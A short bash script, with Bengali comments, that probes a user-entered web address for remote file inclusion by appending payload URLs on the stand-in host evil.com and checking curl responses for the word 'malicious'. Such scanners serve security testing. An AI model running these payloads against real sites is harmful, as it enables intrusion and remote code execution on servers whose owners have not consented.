#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for RFI Test (e.g., http://example.com/index.php?page=):"
read URL

# RFI পে-লোড (বিশেষভাবে সার্ভার অ্যাক্সেস করতে URL দেওয়া)
RFI_PAYLOADS=("http://evil.com/malicious_file.php" "http://evil.com/malicious_script.php")

for payload in "${RFI_PAYLOADS[@]}"
do
    # প্রতিটি প্যারামিটার দিয়ে টেস্ট করা
    TEST_URL="${URL}${payload}"
    RESPONSE=$(curl -s $TEST_URL)

    # যদি রিমোট ফাইল ইনক্লুড করার সঠিক কনফিগারেশন পাওয়া যায়, তবে RFI ভ্যালনারেবিলিটি থাকতে পারে
    if echo $RESPONSE | grep -q "malicious"; then
        echo "[+] Potential RFI vulnerability detected with payload: $payload"
    else
        echo "[-] No RFI vulnerability detected with payload: $payload"
    fi
done
